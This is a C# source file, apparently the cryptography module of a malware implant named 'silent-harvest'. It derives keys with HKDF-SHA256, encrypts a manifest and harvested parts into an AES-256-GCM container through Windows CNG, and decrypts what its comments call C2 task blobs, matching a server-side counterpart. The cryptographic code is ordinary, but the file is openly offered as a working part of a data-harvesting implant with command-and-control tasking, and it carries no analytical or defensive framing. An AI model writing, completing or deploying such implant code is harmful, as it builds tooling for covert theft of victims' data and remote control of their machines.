// silent-harvest implant — HKDF-SHA256 + AES-256-GCM (CNG) container crypto.
// Mirrors server/shcrypto.py byte-for-byte.
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SilentHarvest
{
    public static class Crypto
    {
        public static byte[] Magic { get { return new byte[] { (byte)'S', (byte)'H', (byte)'V', (byte)'1' }; } }
        public const ushort Version = 1;

        // ------------------------------------------------------------- HKDF
        public static byte[] HkdfSha256(byte[] ikm, byte[] salt, byte[] info, int length)
        {
            using (HMACSHA256 h = new HMACSHA256(salt))
            {
                byte[] prk = h.ComputeHash(ikm);
                using (HMACSHA256 h2 = new HMACSHA256(prk))
                {
                    byte[] okm = new byte[length];
                    byte[] t = new byte[0];
                    int filled = 0, counter = 1;
                    while (filled < length)
                    {
                        byte[] input = new byte[t.Length + info.Length + 1];
                        Buffer.BlockCopy(t, 0, input, 0, t.Length);
                        Buffer.BlockCopy(info, 0, input, t.Length, info.Length);
                        input[input.Length - 1] = (byte)counter;
                        t = h2.ComputeHash(input);
                        int take = Math.Min(t.Length, length - filled);
                        Buffer.BlockCopy(t, 0, okm, filled, take);
                        filled += take;
                        counter++;
                    }
                    return okm;
                }
            }
        }

        // -------------------------------------------------------- AES-256-GCM
        public static byte[] AesGcmEncrypt(byte[] key, byte[] nonce, byte[] plaintext, byte[] aad)
        {
            IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero, keyObj = IntPtr.Zero;
            try
            {
                int st = Native.BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
                if (st != 0) throw new Exception("BCryptOpenAlgorithmProvider " + st);
                byte[] modeVal = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                st = Native.BCryptSetProperty(hAlg, "ChainingMode", modeVal, modeVal.Length, 0);
                if (st != 0) throw new Exception("BCryptSetProperty " + st);

                byte[] objLen = new byte[4];
                int got;
                st = Native.BCryptGetProperty(hAlg, "ObjectLength", objLen, 4, out got, 0);
                if (st != 0) throw new Exception("BCryptGetProperty(ObjectLength) " + st);
                int objSize = BitConverter.ToInt32(objLen, 0);
                keyObj = Marshal.AllocHGlobal(objSize);

                st = Native.BCryptGenerateSymmetricKey(hAlg, out hKey, keyObj, objSize, key, key.Length, 0);
                if (st != 0) throw new Exception("BCryptGenerateSymmetricKey " + st);

                byte[] tag = new byte[16];
                Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai =
                    new Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                ai.cbSize = Marshal.SizeOf(typeof(Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                ai.dwInfoVersion = Native.BCRYPT_AUTHENTICATED_MODE_INFO_VERSION;
                GCHandle gNonce = GCHandle.Alloc(nonce, GCHandleType.Pinned);
                GCHandle gTag = GCHandle.Alloc(tag, GCHandleType.Pinned);
                GCHandle gAad = aad != null ? GCHandle.Alloc(aad, GCHandleType.Pinned) : new GCHandle();
                try
                {
                    ai.pbNonce = gNonce.AddrOfPinnedObject();
                    ai.cbNonce = nonce.Length;
                    ai.pbTag = gTag.AddrOfPinnedObject();
                    ai.cbTag = 16;
                    if (aad != null)
                    {
                        ai.pbAuthData = gAad.AddrOfPinnedObject();
                        ai.cbAuthData = aad.Length;
                    }

                    byte[] ct = new byte[plaintext.Length];
                    int cbResult;
                    st = Native.BCryptEncrypt(hKey, plaintext, plaintext.Length, ref ai,
                                              null, 0, ct, ct.Length, out cbResult, 0);
                    if (st != 0) throw new Exception("BCryptEncrypt " + st);

                    byte[] outBuf = new byte[ct.Length + 16];
                    Buffer.BlockCopy(ct, 0, outBuf, 0, ct.Length);
                    Buffer.BlockCopy(tag, 0, outBuf, ct.Length, 16);
                    return outBuf;
                }
                finally
                {
                    if (gNonce.IsAllocated) gNonce.Free();
                    if (gTag.IsAllocated) gTag.Free();
                    if (gAad.IsAllocated) gAad.Free();
                }
            }
            finally
            {
                if (hKey != IntPtr.Zero) Native.BCryptDestroyKey(hKey);
                if (keyObj != IntPtr.Zero) Marshal.FreeHGlobal(keyObj);
                if (hAlg != IntPtr.Zero) Native.BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }

        // GCM decrypt: body+tag separate; returns null on auth failure
        public static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] body, byte[] tag, byte[] aad)
        {
            IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero, keyObj = IntPtr.Zero;
            try
            {
                int st = Native.BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
                if (st != 0) return null;
                byte[] modeVal = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                st = Native.BCryptSetProperty(hAlg, "ChainingMode", modeVal, modeVal.Length, 0);
                if (st != 0) return null;
                byte[] objLen = new byte[4];
                int got;
                st = Native.BCryptGetProperty(hAlg, "ObjectLength", objLen, 4, out got, 0);
                if (st != 0) return null;
                int objSize = BitConverter.ToInt32(objLen, 0);
                keyObj = Marshal.AllocHGlobal(objSize);
                st = Native.BCryptGenerateSymmetricKey(hAlg, out hKey, keyObj, objSize, key, key.Length, 0);
                if (st != 0) return null;

                Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai =
                    new Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                ai.cbSize = Marshal.SizeOf(typeof(Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                ai.dwInfoVersion = Native.BCRYPT_AUTHENTICATED_MODE_INFO_VERSION;
                GCHandle gNonce = GCHandle.Alloc(nonce, GCHandleType.Pinned);
                GCHandle gTag = GCHandle.Alloc(tag, GCHandleType.Pinned);
                GCHandle gAad = aad != null ? GCHandle.Alloc(aad, GCHandleType.Pinned) : new GCHandle();
                try
                {
                    ai.pbNonce = gNonce.AddrOfPinnedObject();
                    ai.cbNonce = nonce.Length;
                    ai.pbTag = gTag.AddrOfPinnedObject();
                    ai.cbTag = 16;
                    if (aad != null)
                    {
                        ai.pbAuthData = gAad.AddrOfPinnedObject();
                        ai.cbAuthData = aad.Length;
                    }
                    byte[] pt = new byte[body.Length];
                    int cbResult;
                    st = Native.BCryptDecrypt(hKey, body, body.Length, ref ai,
                                              null, 0, pt, pt.Length, out cbResult, 0);
                    if (st != 0) return null;
                    byte[] outBuf = new byte[cbResult];
                    Buffer.BlockCopy(pt, 0, outBuf, 0, cbResult);
                    return outBuf;
                }
                finally
                {
                    if (gNonce.IsAllocated) gNonce.Free();
                    if (gTag.IsAllocated) gTag.Free();
                    if (gAad.IsAllocated) gAad.Free();
                }
            }
            finally
            {
                if (hKey != IntPtr.Zero) Native.BCryptDestroyKey(hKey);
                if (keyObj != IntPtr.Zero) Marshal.FreeHGlobal(keyObj);
                if (hAlg != IntPtr.Zero) Native.BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }

        // -------------------------------------------------------- container
        public static byte[] BuildContainer(string manifestJson, byte[] partsBlob, byte[] psk)
        {
            byte[] manifest = System.Text.Encoding.UTF8.GetBytes(manifestJson);
            byte[] plaintext = new byte[4 + manifest.Length + partsBlob.Length];
            plaintext[0] = (byte)(manifest.Length >> 24);
            plaintext[1] = (byte)(manifest.Length >> 16);
            plaintext[2] = (byte)(manifest.Length >> 8);
            plaintext[3] = (byte)(manifest.Length);
            Buffer.BlockCopy(manifest, 0, plaintext, 4, manifest.Length);
            Buffer.BlockCopy(partsBlob, 0, plaintext, 4 + manifest.Length, partsBlob.Length);

            byte[] salt = new byte[16];
            byte[] nonce = new byte[12];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(salt);
                rng.GetBytes(nonce);
            }
            byte[] key = HkdfSha256(psk, salt, System.Text.Encoding.ASCII.GetBytes("silent-harvest/v1"), 32);
            byte[] aad = new byte[6];
            Buffer.BlockCopy(Magic, 0, aad, 0, 4);
            aad[4] = (byte)(Version >> 8);
            aad[5] = (byte)Version;

            byte[] ct = AesGcmEncrypt(key, nonce, plaintext, aad);
            byte[] body = new byte[ct.Length - 16];
            byte[] tag = new byte[16];
            Buffer.BlockCopy(ct, 0, body, 0, ct.Length - 16);
            Buffer.BlockCopy(ct, ct.Length - 16, tag, 0, 16);

            byte[] outBuf = new byte[42 + ct.Length];
            Buffer.BlockCopy(Magic, 0, outBuf, 0, 4);
            outBuf[4] = (byte)(Version >> 8);
            outBuf[5] = (byte)Version;
            Buffer.BlockCopy(salt, 0, outBuf, 6, 16);
            Buffer.BlockCopy(nonce, 0, outBuf, 22, 12);
            long n = body.Length;
            for (int i = 0; i < 8; i++) outBuf[34 + i] = (byte)(n >> (8 * (7 - i)));
            Buffer.BlockCopy(body, 0, outBuf, 42, body.Length);
            Buffer.BlockCopy(tag, 0, outBuf, 42 + body.Length, 16);
            return outBuf;
        }

        // mirror of shcrypto.unpack -- used to decrypt C2 task blobs
        public static bool UnpackContainer(byte[] blob, byte[] psk,
            out string manifestJson, out byte[] partsBlob)
        {
            manifestJson = null;
            partsBlob = null;
            if (blob == null || blob.Length < 58) return false;
            if (blob[0] != (byte)'S' || blob[1] != (byte)'H' ||
                blob[2] != (byte)'V' || blob[3] != (byte)'1') return false;
            int ver = (blob[4] << 8) | blob[5];
            if (ver != Version) return false;
            byte[] salt = new byte[16];
            Buffer.BlockCopy(blob, 6, salt, 0, 16);
            byte[] nonce = new byte[12];
            Buffer.BlockCopy(blob, 22, nonce, 0, 12);
            long ctLen = 0;
            for (int i = 0; i < 8; i++) ctLen = (ctLen << 8) | blob[34 + i];
            if (ctLen <= 0 || 42 + ctLen + 16 > blob.Length) return false;
            byte[] body = new byte[ctLen];
            Buffer.BlockCopy(blob, 42, body, 0, (int)ctLen);
            byte[] tag = new byte[16];
            Buffer.BlockCopy(blob, 42 + (int)ctLen, tag, 0, 16);
            byte[] key = HkdfSha256(psk, salt,
                System.Text.Encoding.ASCII.GetBytes("silent-harvest/v1"), 32);
            byte[] aad = new byte[6];
            Buffer.BlockCopy(blob, 0, aad, 0, 6);
            byte[] plaintext = AesGcmDecrypt(key, nonce, body, tag, aad);
            if (plaintext == null || plaintext.Length < 4) return false;
            int mlen = (plaintext[0] << 24) | (plaintext[1] << 16) |
                       (plaintext[2] << 8) | plaintext[3];
            if (mlen <= 0 || 4 + mlen > plaintext.Length) return false;
            manifestJson = System.Text.Encoding.UTF8.GetString(plaintext, 4, mlen);
            partsBlob = new byte[plaintext.Length - 4 - mlen];
            Buffer.BlockCopy(plaintext, 4 + mlen, partsBlob, 0, partsBlob.Length);
            return true;
        }
    }
}
